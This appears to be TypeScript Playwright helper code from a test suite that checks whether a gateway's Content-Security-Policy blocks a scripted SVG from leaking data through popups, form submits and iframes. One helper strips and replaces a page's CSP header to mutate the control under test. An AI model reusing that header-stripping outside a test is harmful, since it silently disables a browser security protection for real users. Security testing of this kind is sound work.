/**
 * A watermark into the hit log, taken at the start of a test.
 *
 * Case tags segregate one payload from another; this segregates one RUN of a
 * payload from the next. Three tests below drive the SAME served file
 * (scripted.svg) under three different policies, so without a watermark the
 * `popup` that MUTATION A legitimately produces is still sitting in the log
 * when MUTATION B reads it — which is exactly how it first failed, reporting
 * `["popup"]` for a run in which nothing had leaked at all. A stale hit
 * counted against a later test is a false RED; the same mechanism the other
 * way round would be a false GREEN.
 */
function mark(): number {
  return sink.hits.length;
}

/** Every vector name recorded for one case tag since `from`, in arrival order. */
function arrived(caseTag: string, from: number): string[] {
  const prefix = `/x/${caseTag}/`;
  return sink.hits
    .slice(from)
    .filter((h) => h.path.startsWith(prefix))
    .map((h) => h.path.slice(prefix.length));
}

/** Wait until every named vector has arrived, or the settle budget expires. */
async function waitForVectors(
  caseTag: string,
  from: number,
  wanted: readonly Vector[],
): Promise<string[]> {
  const deadline = Date.now() + SETTLE_MS;
  for (;;) {
    const got = arrived(caseTag, from);
    if (wanted.every((v) => got.includes(v))) return got;
    if (Date.now() > deadline) return got;
    await new Promise((r) => setTimeout(r, 50));
  }
}

/** Spend the FULL settle budget, then report what arrived. The negative oracle. */
async function settleThenRead(caseTag: string, from: number): Promise<string[]> {
  await new Promise((r) => setTimeout(r, SETTLE_MS));
  return arrived(caseTag, from);
}

interface PageReport {
  fired?: string[];
  origin?: string;
  cookie?: string;
}

/**
 * Fire the form-submit probe, in every frame that published one.
 *
 * Called AFTER the report has been read, because a successful form submit
 * navigates its document away and takes both `document.title` and
 * `window.__REPORT__` with it. Frames are walked rather than just the main one
 * so the `<object>`-hosted SVG control is covered too.
 */
async function fireDeferredForm(page: Page): Promise<void> {
  for (const frame of page.frames()) {
    const call = frame
      .evaluate(() => {
        const w = window as unknown as { __fireForm?: () => void };
        if (typeof w.__fireForm === 'function') w.__fireForm();
      })
      .catch(() => undefined);
    // Bounded, because one of the frames on these pages is the BLOCKED iframe
    // probe. WebKit leaves that frame in a state where `evaluate` never
    // settles: measured, the unbounded version turned a 6.6 s pass into a 1.8 m
    // timeout on WebKit alone. A frame that will not answer has no form to
    // fire, so moving on loses nothing.
    await Promise.race([call, new Promise((r) => setTimeout(r, 2_000))]);
  }
}

/** Read the in-page corroborating report. Never the primary oracle. */
async function readReport(page: Page): Promise<PageReport> {
  return page.evaluate(() => {
    const w = window as unknown as { __REPORT__?: PageReport };
    return w.__REPORT__ ?? {};
  });
}

/**
 * Serve one gateway URL through `page.route` with its policy header rewritten.
 *
 * The BYTES stay the gateway's. Only the header changes, and only for the one
 * URL named — which is what makes this a mutation of the control under test
 * rather than a simulation of it.
 */
async function withMutatedPolicy(
  page: Page,
  url: string,
  policy: string,
  body: () => Promise<void>,
): Promise<void> {
  await page.route(url, async (route) => {
    const res = await route.fetch();
    const headers: Record<string, string> = { ...res.headers() };
    // Both spellings, because header maps are case-normalised differently by
    // engine and a leftover original would silently win.
    delete headers['content-security-policy'];
    delete headers['Content-Security-Policy'];
    // route.fetch() returns a decoded body, so the original framing headers no
    // longer describe it.
    delete headers['content-encoding'];
    delete headers['content-length'];
    headers['content-security-policy'] = policy;
    await route.fulfill({ status: res.status(), headers, body: await res.body() });
  });
  try {
    await body();
  } finally {
    await page.unroute(url);
  }
}

